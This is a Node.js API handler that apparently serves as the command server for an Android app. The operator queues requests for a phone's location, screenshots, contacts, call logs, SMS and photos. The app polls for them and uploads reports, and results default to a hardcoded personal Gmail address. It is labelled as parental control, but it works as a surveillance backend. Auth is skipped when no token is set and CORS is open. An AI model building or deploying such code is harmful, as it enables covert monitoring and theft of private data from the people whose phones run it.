const { v4: uuidv4 } = require('uuid');
const { getStore, saveStore, MAX_HISTORY, ALLOWED_ITEMS } = require('../lib/store');

function checkAuth(req) {
  const token = process.env.API_TOKEN || '';
  if (!token) return true;
  const header = req.headers.authorization || '';
  const t = header.startsWith('Bearer ') ? header.slice(7) : '';
  return t === token;
}

function send(res, status, body) {
  res.statusCode = status;
  res.setHeader('Content-Type', 'application/json');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.end(typeof body === 'string' ? body : JSON.stringify(body));
}

module.exports = async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (req.method === 'OPTIONS') {
    res.statusCode = 204;
    return res.end();
  }

  if (!checkAuth(req)) {
    return send(res, 401, { error: 'Unauthorized' });
  }

  const store = getStore();
  const url = new URL(req.url, 'http://localhost');
  const path = url.pathname.replace(/^\/api\/v1/, '').replace(/^\/api/, '') || '/';

  // GET /devices
  if (req.method === 'GET' && (path === '/devices' || path.endsWith('/devices'))) {
    const list = Array.from(store.devices.values()).sort((a, b) => {
      const ta = a.lastSeen || a.createdAt || '';
      const tb = b.lastSeen || b.createdAt || '';
      return tb.localeCompare(ta);
    });
    return send(res, 200, list);
  }

  // GET /reports
  if (req.method === 'GET' && (path === '/reports' || path.endsWith('/reports'))) {
    if (!store.reports) store.reports = [];
    const deviceId = (url.searchParams.get('deviceId') || '').trim();
    if (deviceId) {
      return send(res, 200, store.reports.filter((r) => r.deviceId === deviceId).slice(0, 50));
    }
    return send(res, 200, store.reports.slice(0, 50));
  }

  // POST /reports (upload report directly from APK)
  if (req.method === 'POST' && (path === '/reports' || path.endsWith('/reports'))) {
    let body = req.body;
    if (typeof body === 'string') {
      try { body = JSON.parse(body); } catch { return send(res, 400, { error: 'Invalid JSON' }); }
    }
    if (!body || typeof body !== 'object') {
      try {
        const chunks = [];
        for await (const chunk of req) chunks.push(chunk);
        body = JSON.parse(Buffer.concat(chunks).toString() || '{}');
      } catch {
        return send(res, 400, { error: 'Invalid JSON' });
      }
    }

    const { deviceId, subject, body: reportText, items, screenshotPath } = body || {};
    if (!store.reports) store.reports = [];
    const reportEntry = {
      id: 'rep_' + uuidv4().replace(/-/g, '').slice(0, 10),
      deviceId: (deviceId || 'unknown').trim(),
      subject: subject || 'Parental Control Report',
      body: reportText || '',
      items: items || [],
      screenshotPath: screenshotPath || '',
      receivedAt: new Date().toISOString(),
    };

    store.reports.unshift(reportEntry);
    if (store.reports.length > MAX_HISTORY) store.reports.pop();

    const dev = store.devices.get(reportEntry.deviceId) || {};
    store.devices.set(reportEntry.deviceId, {
      ...dev,
      deviceId: reportEntry.deviceId,
      lastSeen: new Date().toISOString(),
      latestReport: reportEntry,
    });

    saveStore();
    return send(res, 201, { ok: true, reportId: reportEntry.id });
  }

  // GET /commands?deviceId=  (APK poll)
  if (req.method === 'GET' && (path === '/commands' || path.endsWith('/commands'))) {
    const deviceId = (url.searchParams.get('deviceId') || '').trim();
    if (!deviceId) return send(res, 400, { error: 'deviceId required' });

    const existing = store.devices.get(deviceId) || {};
    store.devices.set(deviceId, {
      ...existing,
      deviceId,
      lastSeen: new Date().toISOString(),
      userAgent: req.headers['user-agent'] || '',
    });

    const cmd = store.pending.get(deviceId);
    if (!cmd) {
      saveStore();
      res.statusCode = 204;
      res.setHeader('Access-Control-Allow-Origin', '*');
      return res.end();
    }

    store.pending.delete(deviceId);
    cmd.deliveredAt = new Date().toISOString();
    cmd.status = 'delivered';
    saveStore();

    return send(res, 200, {
      id: cmd.id,
      items: cmd.items,
      emailTo: cmd.emailTo,
    });
  }

  // GET /commands/history
  if (req.method === 'GET' && path.includes('history')) {
    return send(res, 200, store.history.slice(0, 50));
  }

  // GET /commands/pending
  if (req.method === 'GET' && path.includes('pending')) {
    return send(res, 200, Array.from(store.pending.values()));
  }

  // POST /commands  (create)
  if (req.method === 'POST' && (path === '/commands' || path.endsWith('/commands'))) {
    let body = req.body;
    if (typeof body === 'string') {
      try {
        body = JSON.parse(body);
      } catch {
        return send(res, 400, { error: 'Invalid JSON' });
      }
    }
    if (!body || typeof body !== 'object') {
      const chunks = [];
      for await (const chunk of req) chunks.push(chunk);
      try {
        body = JSON.parse(Buffer.concat(chunks).toString() || '{}');
      } catch {
        return send(res, 400, { error: 'Invalid JSON' });
      }
    }

    const { deviceId, items, emailTo } = body;
    const to = (emailTo || 'ankitraj01567@gmail.com').trim();

    if (!deviceId || !Array.isArray(items) || items.length === 0) {
      return send(res, 400, {
        error: 'deviceId and non-empty items[] are required',
      });
    }

    const cleanItems = items
      .map((i) => String(i).toLowerCase().trim())
      .filter((i) => ALLOWED_ITEMS.has(i));

    if (cleanItems.length === 0) {
      return send(res, 400, {
        error: 'No valid items. Allowed: location, screenshot, contacts, call_logs, sms, photos',
      });
    }

    const id = 'cmd_' + uuidv4().replace(/-/g, '').slice(0, 12);
    const command = {
      id,
      deviceId: String(deviceId).trim(),
      items: cleanItems,
      emailTo: to,
      status: 'pending',
      createdAt: new Date().toISOString(),
      deliveredAt: null,
      ackedAt: null,
      ackMessage: null,
    };

    store.pending.set(command.deviceId, command);
    store.history.unshift(command);
    if (store.history.length > MAX_HISTORY) store.history.pop();

    if (!store.devices.has(command.deviceId)) {
      store.devices.set(command.deviceId, {
        deviceId: command.deviceId,
        lastSeen: null,
        createdAt: new Date().toISOString(),
      });
    }
    saveStore();

    return send(res, 201, command);
  }

  // POST /commands/:id/ack
  if (req.method === 'POST' && path.includes('/ack')) {
    const parts = path.split('/').filter(Boolean);
    const idIdx = parts.indexOf('commands');
    const id = parts[idIdx + 1];
    let body = req.body;
    if (!body || typeof body !== 'object') {
      try {
        const chunks = [];
        for await (const chunk of req) chunks.push(chunk);
        body = JSON.parse(Buffer.concat(chunks).toString() || '{}');
      } catch {
        body = {};
      }
    }
    const { status = 'done', message = '' } = body || {};
    const entry = store.history.find((h) => h.id === id);
    if (entry) {
      entry.status = status;
      entry.ackMessage = message;
      entry.ackedAt = new Date().toISOString();
      saveStore();
    }
    return send(res, 200, { ok: true });
  }

  return send(res, 404, { error: 'Not found' });
};
